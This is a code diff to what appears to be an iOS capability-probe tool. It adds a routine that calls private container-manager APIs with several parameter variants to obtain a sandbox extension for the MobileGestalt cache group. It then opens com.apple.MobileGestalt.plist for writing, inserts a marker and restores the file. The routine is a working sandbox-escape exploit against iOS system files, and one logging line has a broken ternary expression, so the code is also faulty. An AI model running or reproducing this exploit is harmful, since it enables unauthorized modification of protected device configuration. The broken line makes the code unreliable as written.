@@ -48,6 +48,7 @@ static NSMutableDictionary *runHandleProbe(void);
 static NSMutableDictionary *runWriteProbe(void);
 static NSString *badQueryToken(NSString *targetPath, NSString *group,
                                uint64_t flags, uint64_t part, BOOL traversal);
+static NSMutableDictionary *runCmgProbe(void);
 
 static NSString *probeRoot(void)
 {
@@ -660,6 +661,19 @@ static NSString *buildTextReport(NSDictionary *report)
             [text appendFormat:@"  OpenOK/Errno          : %@/%@\n",
                 dp[@"OpenOK"], dp[@"OpenErrno"] ?: @"-"];
             [text appendFormat:@"  ReadOK                : %@\n", dp[@"ReadOK"] ?: @"-"];
+        }
+        NSDictionary *cmg = [writeProbe[@"CmgProbe"] isKindOfClass:NSDictionary.class]
+            ? writeProbe[@"CmgProbe"] : nil;
+        NSArray *cmgVariants = [cmg[@"Variants"] isKindOfClass:NSArray.class]
+            ? cmg[@"Variants"] : @[];
+        if (cmgVariants.count > 0) {
+            [text appendString:@"mond/cmg variants:\n"];
+            for (NSDictionary *entry in cmgVariants) {
+                [text appendFormat:@"  %@\n    activate=%@ openWrite=%@ errno=%@ accMode=%@ writeBack=%@ shaMatch=%@\n",
+                    entry[@"Name"], entry[@"Activated"], entry[@"OpenWrite"],
+                    entry[@"OpenErrno"] ?: @"-", entry[@"AccMode"] ?: @"-",
+                    entry[@"WriteBack"] ?: @"-", entry[@"SHA256Match"] ?: @"-"];
+            }
         }
     }
 
@@ -1682,7 +1696,159 @@ static NSMutableDictionary *runWriteProbe(void)
     }
     result[@"DataProtectionProbe"] = dpProbe;
 
+    // 8) mond/cmg variant (rooootdev/mond cmg.swift): the parameter combo
+    // that grants write access to MobileGestalt.plist on iOS 27.0 beta —
+    // platform=2, transient=false, flags=(1<<32)|(1<<39), part 3, using
+    // container_object_get_sandbox_token + activate(res, true), then a
+    // direct O_WRONLY open. Try it plus flag/platform/part variants on 26.6.
+    result[@"CmgProbe"] = runCmgProbe();
+
     logLine(@"==== write capability probe done ====");
+    return result;
+}
+
+// ---- mond/cmg variant -----------------------------------------------------
+static NSMutableDictionary *runCmgProbe(void)
+{
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    logLine(@"==== cmg probe (mond variant) ====");
+
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                       RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) {
+        result[@"Status"] = @"failed";
+        result[@"Stage"] = @"dlopen";
+        return result;
+    }
+    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
+    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
+    void (*query_set_transient)(void *, BOOL) = dlsym(mgr, "container_query_set_transient");
+    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
+    void (*query_set_platform)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_platform");
+    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
+    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
+    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
+    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
+    char *(*object_get_sandbox_token)(void *) = dlsym(mgr, "container_object_get_sandbox_token");
+    BOOL (*object_activate)(void *, BOOL) = (BOOL (*)(void *, BOOL))dlsym(mgr, "container_object_sandbox_extension_activate");
+    void (*object_free)(void *) = dlsym(mgr, "container_object_free");
+    const char *(*object_get_path)(void *) = dlsym(mgr, "container_object_get_path");
+    if (!query_create || !query_set_class || !query_set_transient ||
+        !query_set_group_identifiers || !query_set_platform || !query_set_flags ||
+        !query_set_part || !query_get_single_result || !query_free ||
+        !object_get_sandbox_token || !object_activate || !object_free || !object_get_path) {
+        dlclose(mgr);
+        result[@"Status"] = @"failed";
+        result[@"Stage"] = @"dlsym";
+        logStep(NO, @"cmg dlsym", @"one or more symbols missing");
+        return result;
+    }
+    logStep(YES, @"cmg dlsym", @"all symbols resolved (incl. set_transient/set_platform/get_sandbox_token)");
+
+    NSArray<NSDictionary *> *variants = @[
+        @{@"Name": @"cmg exact (platform=2 flags=0x8000000100 part=3)",
+          @"Flags": @(0x8000000100ULL), @"Platform": @2, @"Part": @3},
+        @{@"Name": @"platform=2 flags=0x900000000 part=3",
+          @"Flags": @(0x900000000ULL), @"Platform": @2, @"Part": @3},
+        @{@"Name": @"platform=2 flags=0x800000000 part=3",
+          @"Flags": @(0x800000000ULL), @"Platform": @2, @"Part": @3},
+        @{@"Name": @"platform=2 flags=0x8000000100 part=0",
+          @"Flags": @(0x8000000100ULL), @"Platform": @2, @"Part": @0},
+        @{@"Name": @"platform=0 flags=0x8000000100 part=3",
+          @"Flags": @(0x8000000100ULL), @"Platform": @0, @"Part": @3},
+        @{@"Name": @"platform=1 flags=0x8000000100 part=3",
+          @"Flags": @(0x8000000100ULL), @"Platform": @1, @"Part": @3},
+        @{@"Name": @"platform=2 flags=0x8000000100 part=3 no-transient-set",
+          @"Flags": @(0x8000000100ULL), @"Platform": @2, @"Part": @3, @"NoTransient": @YES},
+    ];
+
+    NSMutableArray *results = [NSMutableArray array];
+    for (NSDictionary *variant in variants) {
+        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
+        entry[@"Name"] = variant[@"Name"];
+        void *query = query_create();
+        if (!query) {
+            entry[@"Status"] = @"query-failed";
+            [results addObject:entry];
+            continue;
+        }
+        query_set_class(query, 13);
+        if (![variant[@"NoTransient"] boolValue]) query_set_transient(query, false);
+        xpc_object_t xid = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
+        query_set_group_identifiers(query, xid);
+        query_set_platform(query, [variant[@"Platform"] unsignedLongLongValue]);
+        query_set_flags(query, [variant[@"Flags"] unsignedLongLongValue]);
+        query_set_part(query, [variant[@"Part"] unsignedLongLongValue]);
+        void *res = query_get_single_result(query);
+        if (!res) {
+#if !OS_OBJECT_USE_OBJC
+            xpc_release(xid);
+#endif
+            query_free(query);
+            entry[@"Status"] = @"denied";
+            logStep(NO, @"cmg query", [NSString stringWithFormat:@"%@ -> NULL", variant[@"Name"]]);
+            [results addObject:entry];
+            continue;
+        }
+        char *token = object_get_sandbox_token(res);
+        entry[@"Token"] = token ? [NSString stringWithUTF8String:token] : nil;
+        if (token) free(token);
+        BOOL activated = object_activate(res, true);
+        entry[@"Activated"] = @(activated);
+        logStep(activated, @"cmg activate",
+            [NSString stringWithFormat:@"%@ -> %@", variant[@"Name"], activated ? @"YES" : @"NO"]);
+        if (activated) {
+            const char *c_path = object_get_path(res);
+            if (c_path) {
+                NSString *plist = [[NSString stringWithUTF8String:c_path]
+                    stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+                errno = 0;
+                int fd = open(plist.UTF8String, O_WRONLY | O_CLOEXEC | O_NOFOLLOW);
+                entry[@"OpenWrite"] = @(fd >= 0);
+                entry[@"OpenErrno"] = @(fd >= 0 ? 0 : errno);
+                int accmode = -1;
+                if (fd >= 0) {
+                    accmode = fcntl(fd, F_GETFL) & O_ACCMODE;
+                    close(fd);
+                }
+                entry[@"AccMode"] = @(accmode);
+                entry[@"Path"] = plist;
+                logStep(fd >= 0, @"cmg O_WRONLY open",
+                    fd >= 0 ? [NSString stringWithFormat:@"WRITABLE! %@", plist]
+                            : [NSString stringWithFormat:@"errno=%d", errno]);
+                if (fd >= 0) {
+                    // Write a marker and restore, proving write capability.
+                    NSData *original = [NSData dataWithContentsOfFile:plist];
+                    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plist];
+                    if (original && [dict isKindOfClass:NSDictionary.class]) {
+                        NSMutableDictionary *modified = [dict mutableCopy];
+                        modified[@"FuckFileCmgWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
+                        BOOL wrote = [modified writeToFile:plist atomically:YES];
+                        entry[@"WriteBack"] = @(wrote);
+                        logStep(wrote, @"cmg write-back", wrote ? @"MARKER WRITTEN!" : @"failed");
+                        NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:plist];
+                        entry[@"MarkerReadBack"] = @([readBack[@"FuckFileCmgWriteTest"] isKindOfClass:NSNumber.class]);
+                        BOOL restored = original ? [original writeToFile:plist atomically:YES] : NO;
+                        entry[@"Restored"] = @(restored);
+                        NSData *after = [NSData dataWithContentsOfFile:plist];
+                        entry[@"SHA256Match"] = @(after.length && [sha256Hex(after) isEqualToString:sha256Hex(original)]);
+                        logStep(restored && entry[@"SHA256Match"], @"cmg restore+verify",
+                            @"original intact" : @"MISMATCH!");
+                    }
+                }
+            }
+        }
+        entry[@"Status"] = [entry[@"OpenWrite"] boolValue] ? @"writable" : @"readonly-or-denied";
+        object_free(res);
+#if !OS_OBJECT_USE_OBJC
+        xpc_release(xid);
+#endif
+        query_free(query);
+        [results addObject:entry];
+    }
+    dlclose(mgr);
+    result[@"Variants"] = results;
+    logLine(@"==== cmg probe done ====");
     return result;
 }
 
